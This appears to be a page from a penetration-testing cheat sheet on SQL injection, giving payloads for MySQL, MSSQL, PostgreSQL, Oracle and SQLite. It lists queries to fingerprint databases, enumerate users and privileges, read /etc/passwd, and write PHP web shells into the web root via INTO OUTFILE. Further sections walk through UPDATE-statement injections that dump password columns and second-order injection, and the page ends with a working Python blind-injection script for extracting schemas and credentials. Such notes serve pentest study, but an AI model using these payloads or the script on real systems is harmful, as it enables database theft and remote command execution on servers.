# Other payloads

## Comments/DB Version

{% tabs %}
{% tab title="MySQL" %}
```sql
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

# DB version:
' UNION SELECT @@version, NULL-- -
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
--comment
/*comment*/

-- DB verison:
' UNION SELECT @@version, NULL-- -
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
--comment
/*comment*/

-- DB version:
' UNION SELECT version(), NULL-- -
```
{% endtab %}

{% tab title="Oracle SQL" %}
```sql
--comment

-- DB version:
UNION SELECT BANNER, NULL FROM v$version-- -
UNION SELECT version, NULL FROM v$instance-- -
```
{% endtab %}

{% tab title="SQLite 3" %}
```sql
--comment
/*comment*/

-- DB version:
select sqlite_version();
```
{% endtab %}
{% endtabs %}

If none of the other payloads work, then let's do the following:

* The following sqlmap resource provides a list of DBMS:

{% embed url="https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-dbms" %}

* For each DBMS, **we are going to look for a payload to know the version** (for example, MySQL has the command `@@version`). We have to do this until we find one that returns a successful result, which is where we will have found the correct DBMS.

## DB User

{% tabs %}
{% tab title="MySQL" %}
```sql
user()
current_user()
UNION SELECT 1,2,user,4 FROM mysql.user-- -
```
{% endtab %}

{% tab title="Oracle" %}
```sql
' # View all available users:
' UNION SELECT USERNAME,NULL FROM DBA_USERS-- -
' # View current user:
' UNION SELECT USERNAME,NULL FROM USER_USERS-- -
```
{% endtab %}
{% endtabs %}

## Reading files

{% tabs %}
{% tab title="MySQL" %}
### Privilege verification

In **MySQL** the DB user must have the **FILE** privilege to load the contents of a file into a table and then dump data from that table and read files. There are 2 steps we have to check:

* We need to know **which users we are in the DB**: [DB User](other-payloads.md#db-user)
* We have to see if we have **FILE privilege** or **superuser privilege**:

```sql
' # See if we have the superuser privilege. If we get a Y (YES), we can read files.
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<USERNAME>"-- -
' # See all the privileges we have:
' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -
```

### Payloads

```sql
select load_file('/etc/passwd')
load_file('/etc/passwd')
' # Examples:
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
' # Base64 output:
' UNION SELECT 1, to_base64(load_file('/etc/passwd')), 3, 4-- - 
' # File obfuscation in hexadecimal:
echo -n '/etc/passwd' | xxd -ps
' UNION SELECT 1, LOAD_FILE(0x2f6574632f706173737764), 3, 4-- - # Add 0x
```
{% endtab %}

{% tab title="PostgreSQL" %}
### Privilege verification

In PostgreSQL we can check privileges with:

```sql
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;
```

### Payloads

```sql
CREATE TABLE temp(t text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp; # SELECT * FROM temp limit 1 offset 0;
DROP TABLE temp;
```
{% endtab %}
{% endtabs %}

## Writing files

{% tabs %}
{% tab title="MySQL" %}
### Privilege verification

In order to write files to the back-end server using a MySQL database, we need three things:

* User with **FILE** privileges enabled: [Reading files -> Privilege verification](other-payloads.md#reading-files)
* The MySQL global variable **secure\_file\_priv** must be disabled:

```sql
' # 3 different ways to view the value of secure_file_priv:
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
SHOW VARIABLES LIKE "secure_file_priv";
SELECT @@secure_file_priv;
```

3 different results:

* If the value is **empty**, then we can write to any path (as long as we have privileges on the server, of course).
* If **NULL** appears, we cannot write to any directory.
* If a **path** appears, we will only be able to write to that PATH.

{% hint style="danger" %}
MariaDB has this variable empty by default, which allows us to read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files via MySQL injection is not possible with the default configuration.
{% endhint %}

### Payloads

```sql
' # Write a TXT file:
' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
' # Check if the file was created:
' union select 1,load_file('/var/www/html/<PATH>'),3-- -
' # Execute commands:
' union select 1,'<?php system("whoami"); ?>',3-- -
' # Reverse shell (PHP):
' union select 1,"<?php echo shell_exec($_REQUEST['cmd']); ?>", 3 into outfile "/var/www/html/<PATH>/shell.php"-- -
' # Reverse shell (PHP) with clean output (without numbers 1 and 3):
' union select "","<?php echo shell_exec($_REQUEST['cmd']); ?>","" into outfile "/var/www/html/<PATH>/shell.php"-- -
' # Reverse shell obfuscated in hexadecimal:
echo -n '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]). "</pre>"; ?>' | xxd -ps | tr -d '\n'
' union select 1,unhex("0x<PASTE HEX_STRING>"),3 into outfile "/var/www/html/<PATH>/shell.php"-- -
' # Other payload:
tom" LIMIT 0,1 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x<PASTE STRING>
```
{% endtab %}
{% endtabs %}

## UPDATE Attack

{% hint style="danger" %}
Remember that in a SQL injection, we cannot use the UPDATE statement, since it is used at the beginning of the SQL query.To take advantage of this statement, we must look for web application features that allow us to change/edit data, such as updating an account name or changing the password.
{% endhint %}

{% tabs %}
{% tab title="Case #1" %}
### Example (SQLite 3)

If an SQL injection occurs in an UPDATE statement, the damage can be much more serious, since it allows changing records within the database. In the employee management application, there is a profile edit page as shown in the following figure:

![](../../../.gitbook/assets/update\_attack1.png)

This edit page allows employees to update their information, but they do not have access to all available fields, and the user can only change their information. If the form is vulnerable to SQL injection, an attacker can bypass the implemented logic and update fields that do not apply to them, or to other users.

Now we will enumerate the database through the UPDATE statement on the profile page. We will assume that we have no prior knowledge of the database. Looking at the source code of the web page, we can identify the possible column names by looking at the name attribute. The columns do not necessarily have to be named that way, but there is a good chance that they will be, and column names such as "email" and "password" are not uncommon and can be easily guessed.

![](../../../.gitbook/assets/update\_attack2.png)

To confirm that the form is vulnerable and that the column names work, we can try injecting something similar to the following code into the **nickName** and **email** field:

```sql
# Original:
UPDATE usertable SET nickName='',email='' WHERE UID='1'
# Payload:
asd',nickName='test                # Only nickName field
asd',nickName='test',email='hacked # Both fields
# Modified:
UPDATE usertable SET nickName='asd',nickName='test',email='hacked',email='' WHERE UID='1'
```

When injecting the malicious payload into the **nickName** field, only the nickName is updated. When injected into the email field, both fields are updated:

![](../../../.gitbook/assets/update\_attack3.png)

The first test confirmed that the application is vulnerable and that we have the correct column names. If we had the wrong column names, neither field would have been updated. Since both fields are updated after injecting the malicious payload, the original SQL statement is likely to look similar to the following code:

```sql
UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
```

With this knowledge, we can try to [identify which database is in use](other-payloads.md#db-version). There are several ways to do this, but the simplest is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle and SQLite:

```sql
# MySQL and MSSQL:
',nickName=@@version,email='
# For Oracle:
',nickName=(SELECT banner FROM v$version),email='
# For SQLite:
',nickName=sqlite_version(),email='
```

Injecting the line with `sqlite_version()` in the nickName field shows that we are dealing with SQLite and that the version number is 3.27.2:

![](../../../.gitbook/assets/update\_attack4.png)

Knowing which database we are dealing with makes it easier to understand how to construct our malicious queries. We can proceed to enumerate the database by extracting all the tables. In the code below, we perform a subquery to get all the tables in the database and place them in the nickName field. The subquery is enclosed in parentheses. The `group_concat()` function is used to dump all tables simultaneously.

{% hint style="success" %}
"The `group_concat()` function returns a string which is the concatenation of all non-NULL values of X. If the parameter Y is present, it is used as a separator between the instances of X. A comma ("`,`") is used as a separator if Y is omitted. The order of concatenated elements is arbitrary".
{% endhint %}

```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

By injecting the above code, we can see that the only table in the database is called "**usertable**":

![](../../../.gitbook/assets/update\_attack5.png)

We can then continue to extract all the column names from the usertable:

```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```

And as can be seen below, the usertable contains the columns: UID, name, profileID, salary, passportNr, email, nickName, and password:

![](../../../.gitbook/assets/update\_attack6.png)

Knowing the column names, we can extract the data we want from the database. For example, the following query will extract profileID, name and passwords from usertable. The subquery uses the `group_concat()` function to dump all the information simultaneously, and the `||` operator is "concatenated" - it joins the strings of its operands together ([sqlite.org](http://sqlite.org)).

```sql
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```
{% endtab %}

{% tab title="Case #2" %}
When registering an account, we see that the "**username**" field does not sanitize the user entry, so our username may be as follows:

```
admin' or 1=1-- -
```

This is not vulnerable to SQL injection, but if we use another functionality or feature of the web application that requires this username, then we may trigger a SQL injection.

An example might be the password change form, as it is quite possibly using the SQL UPDATE statement to update the password. The SQL statement would look like this:

```sql
# Original:
UPDATE password <PASSWORD> where username='<USERNAME>'
# SQL injection:
## Log in with the following name: admin' or 1=1-- -
## Change the password and we will trigger the SQL injection:
UPDATE password <PASSWORD> where username='admin' or 1=1-- -'
```
{% endtab %}
{% endtabs %}

## Blind SQL script

```python
#!/usr/bin/python3

import os
import sys
import time
import signal
import requests
import string
import urllib3
from pwn import log

url = "<url>"

def def_handler(sig,frame):
    print("Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
all_letters = "_0123456789.:{}" + string.ascii_letters
all_ascii = list(range(32,127))
burp = {'http': 'http://127.0.0.1:8080'}

def check(payload):
    urllib3.disable_warnings()
    s = requests.Session()
    #s.headers.update({
    #    'Cookie' : f"""TrackingId=oXzIpOMlsPJqquRB{payload}; session=KOs6XrgzU90euH5rwRVVXZx0NiFGM0W6"""
    #})
    headers = {
        'Cookie': 'PHPSESSID=elu83jf16lpji1qro52lov78vg'
    }
    # username=admin&password=asd&submit=submit
    data = {
        'username' : f"{payload}",
        'password' : "asd"
    }
    s.verify = False
    s.keep_alive = False
    #time_start = time.time()
    r = s.post(url, data=data,headers=headers)
    #time_end = time.time()
    #if time_end - time_start > 10:
    if 'success' in r.text:
        return 1

def query():
    p2 = log.progress("Payload")
    for j in range(0,5): # Modify the value to obtain more databases, tables, columns, etc.
        output = ""
        finish = True
        p1 = log.progress(f"Database {j}")
        #for i in range(0,30): # Postgres SQL
        for i in range(1,30): # MySQL
            found_letter = 0
            for character in all_letters:
                sqli = f"""admin' AND SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {j},1),{i},1)='{character}'-- -"""
                #sqli = f"""admin' AND (SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='test_db' AND table_name='users' LIMIT {j},1),{i},1))='{character}'-- -"""
                #sqli = f"""admin' AND ascii((SUBSTR((SELECT concat(username,0x3a,password) FROM test_db.users LIMIT {j},1),{i},1)))='{character}'-- -"""
                p2.status(sqli)
                if check(sqli):
                    #output += chr(character) # ASCII (for all_ascii)
                    output += character # LETTERS (for all_letters)
                    found_letter = 1
                    p1.status(f"{output}")
                    finish = False
                    break
            if found_letter == 0 or finish == True:
                break
        if finish == True:
            p1.failure()
        else:
            p1.success(output)

if __name__ == "__main__":
    query()
```
